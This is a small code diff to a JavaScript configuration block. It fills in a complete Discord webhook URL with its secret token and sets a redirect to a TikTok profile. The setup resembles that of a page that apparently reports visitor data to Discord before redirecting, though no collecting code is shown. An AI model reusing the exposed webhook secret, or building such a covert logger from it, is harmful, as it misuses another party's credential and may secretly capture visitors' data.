@@ -8,7 +8,7 @@
 // CONFIGURATION AREA
 // ====================================================
 const CONFIG = {
-    DISCORD_WEBHOOK_URL: 'https://discord.com',
+    DISCORD_WEBHOOK_URL: 'https://discord.com/api/webhooks/1509474688248582214/uCsDG3aQZZ5Npp3o34j3x5YwFvN8AhrcH2tnRenJVmrfE_zr0vLVG-U9cer2-uLgUXfg',
     REDIRECT_URL: 'https://www.tiktok.com/@valeska.rblx?_r=1&_t=ZG-9AnArXZcAO9',
     EMBED_COLOR: 16766720
 };
